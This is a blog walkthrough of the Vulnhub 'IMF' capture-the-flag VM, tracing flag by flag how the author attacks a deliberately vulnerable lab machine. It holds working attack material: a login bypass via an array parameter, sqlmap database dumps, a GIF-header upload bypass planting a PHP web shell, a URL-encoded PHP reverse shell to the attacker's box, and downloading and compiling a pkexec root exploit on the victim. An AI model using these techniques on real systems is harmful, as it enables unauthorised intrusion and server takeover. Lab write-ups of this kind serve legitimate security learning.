---
layout: post
title:  "Vulnhub IMF VM (in progress, verbose version)"
date:   2016-11-09
tags: netsec
---
## Overview

Local network - 172.16.1.0/24

VM - [IMF: 1](https://www.vulnhub.com/entry/imf-1,162/)


## Recon

VM description from site:

> Welcome to "IMF", my first Boot2Root virtual machine. IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. I hope you enjoy this VM and learn something.

VM's from vulnhub are usually have a web front-end, so I will be looking at that.

Find on my LAN

    netdiscover -r 172.16.1.0/24
    
MAC Vendor Camdus Computer Systems = VM Virtualbox

Found possible target - 172.16.1.76

    nmap -sS 172.16.1.76
    port 80 open

Use browser - load IMF Webpage. Click around.

As stated in the description IMF is a US Intelligence agency. The site lists three possible targets:

    Roger S. Michaels
    rmichaels@imf.local
    Director
  
    Alexander B. Keith
    akeith@imf.local
    Deputy Director
  
    Elizabeth R. Stone
    estone@imf.local
    Chief of Staff


## Enumeration

Quick scans from nmap and nikto yield nothing.

A possible vulnerability in web front-end is the contact form. The contact form does not display any errors after submission and Burp Suite shows nothing interesting. This could be a dead end.

In desperation - I decided to view page html source for any hints and got the first flag.

    <!-- flag1{YWxsdGhlZmlsZXM=} -->

Looks like base64, let's decrypt:

```bash
echo YWxsdGhlZmlsZXM= | base64 --decode
allthefiles
```

Back to the browser - http://172.16.1.76/allthefiles - 404. I've tried several extensions (html, txt, etc) with no luck. Back to the html I guess..

Suspicious js files in html head:

```html
<script src="js/ZmxhZzJ7YVcxbVl.js"></script>
<script src="js/XUnRhVzVwYzNS.js"></script>
<script src="js/eVlYUnZjZz09fQ==.min.js"></script>
```

`eVlYUnZjZz09fQ==.min.js` sticks out since it looks like base64 off the bat.

At first I thought the rest could be some backend js caching but let's just try all three:

```bash
echo ZmxhZzJ7YVcxbVl | base64 --decode
flag2{aW1mY

echo XUnRhVzVwYzNS | base64 --decode
base64: invalid input

echo eVlYUnZjZz09fQ== | base64 --decode
yYXRvcg==}
```

Looks looks like i have to concatenate the two successful decodes to get the flag:

    flag2{aW1mYyYXRvcg==}

and one more decode gives me this somewhat garbled text which resembles the CTF VM Name: 

    imfc&F 
    
So it seems like the input is close but not the exact string I need. After several attempts at combining strings, I ended up with this (which was the most obvious), `ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==`

```bash
echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 --decode
flag2{aW1mYWRtaW5pc3RyYXRvcg==}

echo aW1mYWRtaW5pc3RyYXRvcg== | base64 --decode
imfadministrator
```

Okay, back to the browser with our findings:

- http://172.16.0.76/imfadministrator - 200 OK

Awesome, found the admin login area.

I tried some dummy data for username and password. Two things I noticed about this form:

1. It looks like the form insecurely lets me know that the username I've tried is incorrect. 
2. Uses a phpsessid.

In Burp Suite, the "failed login" page's response gives us a nice note from the developer (also could probably be Roger S. Michaels - the director):

```html
Invalid username.
<form method="POST" action="">
<label>Username:</label><input type="text" name="user" value=""><br />
<label>Password:</label><input type="password" name="pass" value=""><br />
<input type="submit" value="Login">
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
</form>
```

At this point it looks like this is the form I'd have to exploit to get the rest of the flags.

## Exploitation

Based off of Enumeration I will probably have to do some the following things:

1. Brute force the username, probably using the names/ emails found on the public page
2. Brute force the password
3. Something with the PHPSESSID (I just don't know what yet)

### Users enumeration

In Burp Suite, I tested the following usernames to see if if the "Invalid username" message does not appear:

    rmichaels@imf.local: Invalid username.
    akeith@imf.local: Invalid username.
    estone@imf.local: Invalid username.
    *** rmichaels: Invalid password. ***
    akeith: Invalid username.
    estone: Invalid username.
    
Got a hit on Roger S. Michaels's username. 

### Bruteforce

Since bruteforcing seems to be a usual way to get flags in other Vulnhub VMs, I'll try to brute force Roger's account using hydra and a list built into kali at `/usr/share/wordlists/*`. I'll start with the popular rockyou list. After a few hours of false positives and 301 errors I was able to craft a http-form-post string in hydra thanks to Burp Suite, Wireshark lots of Googling. In the end, I found that it was a missing "=" that got the best of me.

```bash
cd /usr/share/wordlists/
gunzip ./rockyou.txt.gz

hydra -l rmichaels -P /usr/share/wordlists/rockyou.txt 172.16.1.76 http-form-post "/imfadministrator/index.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=71jtqremlb5q74hge3apaog8d3" -t 64
```
24 hours later - I was probably wrong about having to brute force this form.

Perhaps a something easier? The hint that the developer gives is:

```html
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
```

So the login code/ query might be something like this:

```
// Source http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html
// http://www.sqlinjection.net/login/
$query="select user,pass from users where user='$user' and $pass='HardC0dedP@ss'";
```
or

```
$query="select user from users where user='$user'";
// some php login to check if $_POST['pass'] == "HardC0dedP@ss"
```

## Failure

After many wasted hours, I needed help. I found out that I was close, but an login bypass via sql injection was the wrong path to take. I needed to modify the password POST parameter to confuse validation. In Burp Suite, I modified the html field `pass` to `pass[]`.

Request:

```
POST /imfadministrator/index.php?id=1 HTTP/1.1
Host: 172.16.1.76
User-Agent: Mozilla/5.0 (Hydra)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.1.76/imfadministrator/index.php?id=1
Cookie: PHPSESSID=b9d9u2tlf9f6haipank2vvj136
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

user=rmichaels&pass[]=aaa
```

Response:

```
HTTP/1.1 200 OK
Date: Fri, 11 Nov 2016 23:19:29 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 100
Connection: close
Content-Type: text/html; charset=UTF-8

flag3{Y29udGludWVUT2Ntcw==}<br />Welcome, rmichaels<br /><a href='cms.php?pagename=home'>IMF CMS</a>
```

Awesome. Now that I'm in, more recon. FYI, the decoded base64 in the flag is `continueTOcms` so lets do that.

## Inside the CMS

The urls that are available in the CMS:

```html
<a href='cms.php?pagename=home'>Home</a> | 
<a href='cms.php?pagename=upload'>Upload Report</a> | 
<a href='cms.php?pagename=disavowlist'>Disavowed list</a> | 
```

Few things I noted:

- The way that the urls are structured makes it seem like the backend could be vulnerable to an LFI or SQLi exploit. 
- The upload page looks inactive.
- The disavowlist seems interesting, maybe next flag is to view this page uncensored?

Messing with the url gives me these:

```
http://172.16.1.76/imfadministrator/cms.php?pagename=home':
Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29

http://172.16.1.76/imfadministrator/cms.php?pagename='or 'a'='a':
Under Construction.
```

I tried doing this by hand but resorted to using sqlmap. Since you can only access the CMS after logging in, you will need to pass the PHPSESSID through sqlmap: `sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113`.

I ran the following commands with enumeration switches so that I don't have to manually parse through the output

```bash
sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113
...output
current database:    'admin'
...output

# enumerate tables before dumping - just to get an idea
sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113 -D admin --tables
[12:02:23] [INFO] fetching tables for database: 'admin'
[12:02:23] [INFO] the SQL query used returns 1 entries
[12:02:23] [INFO] resumed: pages
Database: admin                                                                                                                                                                                             
[1 table]
+-------+
| pages |
+-------+

# And dump:
sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113 -D admin --dump
Database: admin
Table: pages
[4 entries]
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | pagename             | pagedata                                                                                                                                                              |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | upload               | Under Construction.                                                                                                                                                   |
| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
| 3  | tutorials-incomplete | Training classrooms available. <br /><img src="./images/whiteboard.jpg"><br /> Contact us for training.                                                               |
| 4  | disavowlist          | <h1>Disavowed List</h1><img src="./images/redacted.jpg"><br /><ul><li>*********</li><li>****** ******</li><li>*******</li><li>**** ********</li></ul><br />-Secretary |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+

```

So the dump gives us this unpublished page: tutorials-incomplete.

Browsing to that page gives us a picture of a classroom with a QR code. I just used the Window's builtin Snipping Tool to extrat the picture of the QR, and uploaded the picture over on https://webqr.com/ to get the following flag:

```
flag4{dXBsb2Fkcjk0Mi5waHA=}
```

Which decodes to `uploadr942.php`

## Backdoor

The previous flag gives us an upload form located at http://172.16.1.76/imfadministrator/uploadr942.php

I'm guessing this will give me a chance to upload a file, but it looks like the form accepts image files (png, jpeg, etc) so I will probably have to figure out how to bypass this. I initially tried to rename a .php file with .jpeg, but got an error `Error: Invalid file data.` so I'll probably have to fire up Burp Suite and mess with some header information. I'll probably have to mess with the php file too. Browsing to http://172.16.1.76/imfadministrator/uploads gives me a Forbidden error which is better than a 404 since now I know that this directory exists within the CMS.

On a successful file upload, the following page gives this comment in the html: `<!-- a4439acbfd50 -->` which changes after every upload. It looks like it could be a checksum of some type, and is probably based off of the current time + file. Since the upload form allows me to upload multiple files with the same name, this could be the unique filename generated by the CMS. When I browse to http://172.16.1.76/imfadministrator/uploads/a4439acbfd50.png, I get the uploaded file.

Next step is to trick the upload form into letting me upload a malicious php file. After multiple attempts, I've learned the following about this CMS' upload form:

1. It checks for a file extension of an image type (jpg, png, etc.).
2. It checks the file header. You cannot just rename a .php into .jpeg without additional modification.
3. It has a generic WAF that checks for code. I got this error on initial attempts: `Error: CrappyWAF detected malware. Signature: system php function detected`
4. It serves you the file directly and is not embedded in a page, so injection via EXIF may not be possible.

I ended up exploiting option 2 from above and needed the help of another walkthrough using this VM. The cleanest option is to create an empty file and inject code that way. Here are some sources I found that helped me:

- https://samsclass.info/121/proj/p7-image-header.htm
- http://superuser.com/questions/237495/how-do-i-show-the-header-of-a-file-in-unix
- http://www.file-recovery.com/jpg-signature-format.htm

```bash
# I found out later that this is only possible with a gif file
# Create an empty gif, insert the gif header signature:
echo "FFD8FFE0" | xxd -r -p > bad.gif

# Verify:
identify bad.gif 

# Okay not the best output, but it does see it as a gif

# Inject code:
echo '<?php $cmd=$_GET["cmd"]; echo `$cmd`; ?>' >> bad.gif 
```

I am now able to inject code by appending bash commands at the end of the url like so:

```
http://172.16.1.76/imfadministrator/uploads/c944d398fb56.gif?cmd=whoami:
����www-data 
```

```bash
# Using curl makes this easier
curl http://172.16.1.76/imfadministrator/uploads/c944d398fb56.gif?cmd=ls
����c944d398fb56.gif 
flag5_abc123def.txt 

curl http://172.16.1.76/imfadministrator/uploads/flag5_abc123def.txt 
flag5{YWdlbnRzZXJ2aWNlcw==}

echo YWdlbnRzZXJ2aWNlcw== | base64 --decode
agentservices

```
Great, found the flag. I can probably attempt a reverse shell from here. The go-to list I use is http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet but to make it easier, I check if netcat is installed first.

```bash
curl http://172.16.1.76/imfadministrator/uploads/c944d398fb56.gif?cmd=which%20nc%20
����/bin/nc
```

After many tries, I gave up on using `nc` from the victim box, and moved to php. It took me a while to get the syntax correct.

On attack box, use `nc` to listen on port 6000: `nc -vvvlkp 6000`

From attack box (172.16.1.77), have victim box initiate the connection to the attack box.
```bash
curl http://172.16.1.76/imfadministrator/uploads/c944d398fb56.gif?cmd=php%20-r%20%27%24sock%3Dfsockopen\(%22172.16.1.77%22%2C6000\)%3Bexec\(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22\)%3B%27
```

And success!

```bash
root@kalisee:~# nc -vvvlkp 6000 
listening on [any] 6000 ...
192.168.100.76: inverse host lookup failed: Unknown host
connect to [192.168.100.77] from (UNKNOWN) [192.168.100.76] 56672
/bin/sh: 0: can't access tty; job control turned off
$
```

Next step: privilege escalation.

## Root

One technique I learned from another exercise is to look for any interesting executable files.

https://www.rebootuser.com/?p=1623

```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/pkexec
/bin/su
/bin/ping
/bin/umount
/bin/ping6
/bin/fusermount
/bin/ntfs-3g
/bin/mount
```

I'm not familiar with all the software included on linux machines but `/usr/bin/pkexec` looks very interesting. A quick google search brings me to CVE-2011-1485: pkexec - Race Condition Privilege Escalation. I hope this isn't a waste of time.

On the victim box:

```bash
$ whoami
www-data
$ cd /tmp
$ wget https://www.exploit-db.com/download/17942
$ mv 17942 17942.c
$ gcc ./17942.c -o funfunfun       
$ ./funfunfun
pkexec local root exploit by xi4oyu , thx to dm
$ whoami
www-data
```

Dead end. I should've checked the version first, the vitim machine is running pkexec v0.105. The vulnerable version is v0.101.

After much poking around, I decided to refer to another walkthrough. The previous flag was the clue I needed. I look for any file with the text "agent": `find / -type f -name "*agent*" -print 2>/dev/null`. The interesting file in the output is /usr/local/bin/agent. Running the program gives us a reporting system for IMF:

```
agent
  ___ __  __ ___
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 1
Invalid Agent ID
```

If you run `ls /usr/local/bin/` you find `access_codes`:

```
$ cat /usr/local/bin/access_codes
SYN 7482,8279,9467
```

I'm guessing these have something to do with SYN/ACK. More research brings me to port knocking. This was all new to me so I needed to do some research first. I used the bash loop from the other walkthrough: `for x in 7482 8279 9467; do nmap -p $x 192.168.100.76; done`. After doing a full nmap scan, I found that port 7788 is now open.

```bash
telnet 192.168.100.76 7788
Trying 192.168.100.76...
Connected to 192.168.100.76.
Escape character is '^]'.
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 
```

I was able to use ltrace to find the agent ID in the binary.

```bash
$ ltrace agent                                        
__libc_start_main(0x80485fb, 1, 0xffeade54, 0x8048970 <unfinished ...>
setbuf(0xf7736d60, 0)                            = <void>
asprintf(0xffeadd88, 0x80489f0, 0x2ddd984, 0xf759e0ec) = 8
puts("  ___ __  __ ___ "  ___ __  __ ___ 
)                        = 18
puts(" |_ _|  \\/  | __|  Agent" |_ _|  \/  | __|  Agent
)                = 25
puts("  | || |\\/| | _|   Reporting"  | || |\/| | _|   Reporting
)            = 29
puts(" |___|_|  |_|_|    System\n" |___|_|  |_|_|    System

)              = 27
printf("\nAgent ID : "
Agent ID : )                          = 12
fgets(12
"12\n", 9, 0xf77365a0)                     = 0xffeadd8e
strncmp("12\n", "48093572", 8)                   = -1 #strncmp gives it away
puts("Invalid Agent ID "Invalid Agent ID 
)                        = 18
+++ exited (status 254) +++

```

I logged in with the agent number and played around with the software. I found that I can cause a segfault by giving 
```bash
$ agent
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 48093572
Login Validated 
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
Enter selection: 3
Report: gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg
Submitted for review.
Segmentation fault (core dumped)

```

BRB while I google "how to exploit segfault"